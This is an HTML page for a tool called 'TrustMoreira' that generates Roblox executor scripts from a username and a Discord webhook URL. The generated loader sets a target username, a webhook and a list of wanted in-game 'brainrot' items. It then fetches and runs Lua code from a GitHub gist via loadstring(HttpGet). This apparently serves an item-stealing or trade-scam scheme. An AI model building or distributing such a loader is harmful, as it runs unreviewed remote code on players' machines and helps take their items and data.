<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TrustMoreira | Vinnhub</title>
<style>
  /* [CSS omitted for brevity but should match your existing cyberpunk style] */
  :root { --bg: #080a0e; --accent: #00e5ff; --text: #dde4f0; }
  body { background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; }
  .panel { background: #13161f; border: 1px solid #1c2130; border-radius: 12px; margin-bottom: 1.2rem; }
  .btn-gen { width: 100%; padding: 1rem; background: linear-gradient(130deg, var(--accent), #38bdf8); cursor: pointer; font-weight: bold; }
  .code-block { background: #080a0e; padding: 1rem; color: #7ecfe8; white-space: pre; overflow-x: auto; border-radius: 8px; }
</style>
</head>
<body>
<div class="wrap">
  <header style="text-align:center;"><h1>TrustMoreira</h1></header>

  <div class="panel">
    <div style="padding:1.25rem;">
      <input class="txt" id="usernameInput" type="text" placeholder="Your Roblox Username">
      <input class="txt" id="webhookInput" type="text" placeholder="Discord Webhook URL" style="margin-top:10px;">
    </div>
  </div>

  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>

  <div class="panel">
    <div class="pb"><div class="code-block" id="outputBlock">-- Select items and hit generate</div></div>
  </div>
</div>

<script>
function generate() {
  const username = document.getElementById('usernameInput').value.trim();
  const webhook = document.getElementById('webhookInput').value.trim();
  
  // Logic to get selected items would go here
  const brainrotLines = `-- Add your selected items here`;

  // YOUR CUSTOMIZED LOADER
  const script = `getgenv().TARGET_USERNAME = "${username}"
getgenv().WEBHOOK_URL = "${webhook}"
getgenv().WANTED_BRAINROTS = {
    ${brainrotLines}
}
loadstring(game:HttpGet("https://gist.githubusercontent.com/HopeThisWorkPpp/c2788cdfd3c62296b8721e721f66b396/raw/973acbe9093269a953503bee64d5aabf70c901e7/main.lua"))()`;

  document.getElementById('outputBlock').textContent = script;
}
</script>
</body>
</html>
